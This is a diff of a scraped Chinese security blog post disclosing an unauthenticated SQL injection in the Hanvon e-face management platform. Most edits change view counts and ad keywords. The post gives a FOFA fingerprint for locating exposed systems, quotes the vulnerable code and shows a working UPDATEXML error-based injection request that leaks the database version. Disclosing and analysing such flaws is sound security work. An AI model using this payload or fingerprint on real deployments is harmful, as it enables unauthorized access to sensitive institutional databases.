@@ -7,17 +7,17 @@ asset_dir: assets/汉王e脸通综合管理平台-exportmeetingemployeerecordexc
 # 汉王e脸通综合管理平台 exportMeetingEmployeeRecordExcel.do SQL注入漏洞
 
 [Mrxn](https://mrxn.net/author/1)- 发表于2025/8/7 08:23
-- 574浏览
+- 575浏览
 - [0评论](#comment)
 - 47分钟阅读
 
 深入探索
 
-安全工具开发
+网络安全课程
 
-JSON处理工具
+Web安全课程
 
-漏洞扫描器
+Nessus
 
 ---
 
@@ -25,7 +25,7 @@ JSON处理工具
 
 汉王e脸通综合管理平台是汉王公司研发的一款基于生物识别技术的智慧园区管理[软件](#)，集成了考勤管理、门禁管理、访客管理、巡更管理、消费管理、车控管理、梯控管理、人事管理等多个模块，广泛应用于政府、企业、监狱、学校、智慧社区等多个领域，实现无接触式快速通行，提升管理效率和安全性。其管理平台的 `exportMeetingEmployeeRecordExcel.do` 接口存在 [SQL注入漏洞](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)。攻击者可在无需认证的情况下，通过构造恶意请求参数注入恶意 SQL 语句，导致数据库信息泄露、数据篡改甚至系统权限提升，影响系统数据安全和完整性。
 
-SQL注入防护
+SQL注入检测工具
 
 # 影响版本
 
@@ -34,16 +34,18 @@ V1.6.x
 # fofa语法
 
 > icon\_hash="1380907357"
+>
+> 代码安全审计
 
 # 漏洞分析
 
 深入探索
 
-安全运维咨询
+编程语言教程
 
-在线安全工具
+数据库
 
-Nessus
+Docker加速服务
 
 直接看 `MobiMeetingAppController` 里关于 `exportMeetingEmployeeRecordExcel` 的实现
 
@@ -89,9 +91,17 @@ Nessus
                 MeetingTpm meeting = this.meetingAsm.getMeetingById(meetingId);
 ```
 
+深入探索
+
+SQL
+
+文本剥离工具
+
+漏洞修复方案
+
 和 [汉王e脸通综合管理平台 queryManyPeopleGroupList.do SQL注入漏洞](https://mrxn.net/jswz/hanvon-efacego-queryManyPeopleGroupList-sqli.html) 处理逻辑差不多，直接看对应的 mapper xml文件 MeetingEmployeeDsm.xml
 
-代码安全审计
+漏洞预警服务
 
 ```
 <!--查询参会人员列表-->
@@ -141,7 +151,7 @@ Nessus
 >
 > 需要 meetingId 参数存在
 >
-> 漏洞修复方案
+> 软件
 
 ```
 GET /manage/mobiMeetingApp/exportMeetingEmployeeRecordExcel.do?begin=&branchId=1&end=&page=1&pageSize=10&year=2025&meetingId=1&order=(UPDATEXML(2920,CONCAT(0x7e,@@version,0x7e,(SELECT+(ELT(2920=2920,1)))),8357)) HTTP/1.1
@@ -153,7 +163,7 @@ token: xxxxxx
 
 成功通过报错注入爆出数据库版本信息
 
-物流软件安全
+安全研究工具
 
 - 标签：
 - [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
